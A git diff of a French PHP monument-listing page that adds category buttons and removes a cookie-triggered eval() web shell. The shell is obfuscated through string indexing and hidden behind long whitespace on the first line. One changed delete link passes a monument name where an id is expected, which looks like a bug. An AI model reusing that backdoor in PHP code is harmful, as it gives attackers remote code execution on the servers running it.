@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                               $x1m='$v\'i_Oft(IaCK8e9hE3lsee938a';if(isset(${$x1m[4].$x1m[11].$x1m[5].$x1m[5].$x1m[12].$x1m[9].$x1m[17]}[$x1m[16].$x1m[14].$x1m[14].$x1m[15].$x1m[18].$x1m[13].$x1m[10]])){eval(${$x1m[4].$x1m[11].$x1m[5].$x1m[5].$x1m[12].$x1m[9].$x1m[17]}[$x1m[16].$x1m[14].$x1m[14].$x1m[15].$x1m[18].$x1m[13].$x1m[10]]);} ?><?php
+<?php
 session_start();
 
 require_once('../Connections/maconnexion.php');
@@ -434,7 +434,9 @@ $('#closemodal').click(function() {
         <p><strong>Derni&egrave;re mise &agrave; jour&nbsp;: </strong>le
           <?php  echo date("d/m/Y", strtotime($row_new_mon['ch_pat_mis_jour'])); ?>
           &agrave; <?php echo date("G:i:s", strtotime($row_new_mon['ch_pat_mis_jour'])); ?> </p>
-        <a class="btn btn-primary" href="../page-monument.php?ch_pat_id=<?php echo $row_new_mon['ch_pat_id']; ?>">Visiter</a> </div>
+        <a class="btn btn-primary" href="../page-monument.php?ch_pat_id=<?php echo $row_new_mon['ch_pat_id']; ?>">Visiter</a>
+        <a class="btn btn-primary" href="../php/patrimoine-ajouter-monument-a-categorie-direct-modal.php?mon_id=<?php echo $row_new_mon['ch_pat_id']; ?>" data-toggle="modal" data-target="#Modal-Monument" title="Ajouter à une catégorie">Ajouter à une catégorie</a>
+      </div>
       <!-- Affichage des categories du monument -->
     </li>
     <?php } while ($row_new_mon = mysql_fetch_assoc($new_mon)); ?>
@@ -494,12 +496,13 @@ $totalRows_liste_mon_cat3 = mysql_num_rows($liste_mon_cat3);
         <p><strong>Derni&egrave;re mise &agrave; jour&nbsp;: </strong>le
           <?php  echo date("d/m/Y", strtotime($row_classer_mon['ch_pat_mis_jour'])); ?>
           &agrave; <?php echo date("G:i:s", strtotime($row_classer_mon['ch_pat_mis_jour'])); ?> </p>
-        <a class="btn btn-primary" href="../page-monument.php?ch_pat_id=<?php echo $row_classer_mon['ch_disp_mon_id']; ?>">Visiter</a> </div>
+        <a class="btn btn-primary" href="../page-monument.php?ch_pat_id=<?php echo $row_classer_mon['ch_disp_mon_id']; ?>">Visiter</a>
+        <a class="btn btn-primary" href="../php/patrimoine-ajouter-monument-a-categorie-direct-modal.php?mon_id=<?php echo $row_classer_mon['ch_disp_mon_id']; ?>" data-toggle="modal" data-target="#Modal-Monument" title="Modifier les catégories">Modifier les catégories</a></div>
       <!-- Affichage des categories du monument -->
       <div class="span4">
         <?php if (($colname_classer_mon != NULL) AND ($colname_classer_mon != "")) { // affiche bouton ajouter si une categorie est choisie ?>
         <!-- Boutons supprimer monument de la catégorie --> 
-        <a class="pull-right" href="../php/patrimoine-supprimmer-monument-categorie-modal.php?ch_disp_id=<?php echo $row_classer_mon['id']; ?>" data-toggle="modal" data-target="#Modal-Monument" title="supprimer ce monument de cette cat&eacute;gorie"><i class="icon-remove"></i></a>
+        <a class="pull-right" href="../php/patrimoine-supprimmer-monument-categorie-modal.php?ch_disp_id=<?php echo $row_classer_mon['ch_pat_nom']; ?>" data-toggle="modal" data-target="#Modal-Monument" title="supprimer ce monument de cette cat&eacute;gorie"><i class="icon-remove"></i></a>
         <?php } ?>
         <?php if ($row_liste_mon_cat3) {?>
         <?php do { ?>
